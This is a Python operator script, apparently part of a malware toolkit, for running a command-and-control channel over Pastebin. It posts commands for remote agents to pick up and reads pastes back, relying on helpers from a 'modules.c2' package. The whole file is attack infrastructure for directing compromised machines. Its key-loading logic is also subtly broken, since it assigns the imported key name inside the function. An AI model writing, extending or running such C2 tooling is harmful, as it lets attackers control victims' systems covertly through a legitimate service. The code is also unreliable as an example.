import argparse
import logging
from modules.c2 import post_to_pastebin, get_from_pastebin, PASTEBIN_API_KEY
import json

def main():
    parser = argparse.ArgumentParser(description="Operator script for managing the C2 channel.")
    parser.add_argument("command", choices=['post', 'get'], help="The action to perform.")
    parser.add_argument("--paste-id", help="The ID of the paste to get or update.")
    parser.add_argument("--command-to-post", help="The command to post to the C2 channel.")
    parser.add_argument("--api-key", help="Your Pastebin API key.")

    args = parser.parse_args()

    # Load API key
    if args.api_key:
        PASTEBIN_API_KEY = args.api_key
    else:
        try:
            with open("config.json") as f:
                config = json.load(f)
                PASTEBIN_API_KEY = config.get("pastebin_api_key")
        except (FileNotFoundError, json.JSONDecodeError):
            pass

    if not PASTEBIN_API_KEY:
        print("Pastebin API key not found. Please provide it with --api-key or in config.json.")
        return

    if args.command == 'post':
        if not args.command_to_post:
            print("Error: --command-to-post is required for the 'post' action.")
            return

        title = f"C2 Command: {args.command_to_post[:20]}"
        # If a paste ID is provided, we are updating an existing paste.
        # The Pastebin API doesn't directly support editing, so we post a new one
        # and would ideally update the agent to look at the new URL.
        # For simplicity here, we'll just post a new one.
        url = post_to_pastebin(title, args.command_to_post)
        if url:
            print(f"Command posted. New C2 URL: {url}")

    elif args.command == 'get':
        if not args.paste_id:
            print("Error: --paste-id is required for the 'get' action.")
            return

        content = get_from_pastebin(args.paste_id)
        if content:
            print(f"\n--- Content of Paste {args.paste_id} ---\n")
            print(content)
            print("\n-------------------------------------\n")

if __name__ == "__main__":
    main()